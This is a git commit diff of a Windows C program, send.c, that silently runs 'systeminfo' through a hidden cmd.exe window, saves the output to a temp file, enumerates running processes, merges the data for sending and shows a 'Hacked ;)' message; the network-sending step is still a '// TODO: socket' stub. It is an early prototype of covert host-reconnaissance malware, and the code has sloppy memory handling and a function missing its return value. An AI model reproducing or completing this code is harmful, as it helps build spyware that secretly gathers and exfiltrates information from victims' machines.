8e2edc9895e546b34bff8b6602332d8d9954e265
SpK <egor.spk@gmail.com>
2016-09-25 20:50:57 +0300

    trololo

--- send/send.c
+++ send/send.c
@@ -1,14 +1,18 @@
 #include <windows.h>
 #include <TlHelp32.h>
-char* getProcList();
+#include <stdio.h>
+char* get_proc_list();
 
-BOOL sendData();
+BOOL data_accumulation();
+BOOL send_data();
+BOOL write_sys_info();
+char* get_data();
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-	char* result  = getProcList();
+	char* result = get_data();
 
-	if(sendData())
+	if (send_data())
 	{
 		MessageBox(NULL, "Send - OK", "Info", MB_ICONINFORMATION);
 	}
@@ -19,7 +23,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	return 0;
 }
 
-char* getProcList()
+char* get_proc_list()
 {
 	HANDLE hProcSnap;
 	PROCESSENTRY32 pe32;
@@ -42,7 +46,78 @@ char* getProcList()
 	return procList;
 }
 
-BOOL sendData()
+BOOL data_accumulation()
 {
-	
+	char *sysinfo, *procList, *result;
+	UINT sysInfoLen, procListLen;
+	write_sys_info();
+	sysinfo = get_data();
+	sysInfoLen = strlen(sysinfo);
+	procList = get_proc_list();
+	procListLen = strlen(procList);
+
+	result = (char*)malloc(sizeof(char*) * (procListLen + sysInfoLen + 100));
+	ZeroMemory(result, _msize(result));
+	memcpy(result, sysinfo, sysInfoLen);
+	memcpy(result + sysInfoLen, procList, procListLen);
+
+	free(sysinfo);
+	free(procList);
+
+	if (strlen(result) > 100)
+	{
+		MessageBox(NULL, "Hacked ;)", "LOL", MB_ICONINFORMATION);
+	}
+}
+
+BOOL send_data()
+{
+	// TODO: socket
+	return data_accumulation();
+}
+
+BOOL write_sys_info()
+{
+	STARTUPINFO StartupInfo;
+	PROCESS_INFORMATION ProcessInfo;
+	memset(&StartupInfo, 0, sizeof(StartupInfo));
+
+	StartupInfo.cb = sizeof(STARTUPINFO);
+	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+	StartupInfo.wShowWindow = SW_HIDE;
+
+	if (!CreateProcess(NULL,
+	                       "C:\\Windows\\System32\\cmd.exe /C \"chcp 65001 & systeminfo > %TEMP%\\data.txt\"",
+	                       NULL,
+	                       NULL,
+	                       FALSE,
+	                       CREATE_NO_WINDOW,
+	                       NULL,
+	                       NULL,
+	                       &StartupInfo,
+	                       &ProcessInfo)
+	)
+		return FALSE;
+	return TRUE;
+}
+
+char* get_data()
+{
+	char tempPath[CHAR_MAX ] = {0};
+	FILE* file;
+	UINT size = 0;
+	char* data;
+	GetTempPath(CHAR_MAX, tempPath);
+
+	strcat(tempPath, "\\data.txt");
+	file = fopen(tempPath, "r");
+	fseek(file, 0, SEEK_END);
+	size = ftell(file);
+	rewind(file);
+
+	data = (char*)malloc(sizeof(char*) * size);
+	ZeroMemory(data, _msize(data));
+	fread(data, 1, size, file);
+	fclose(file);
+	return data;
 }
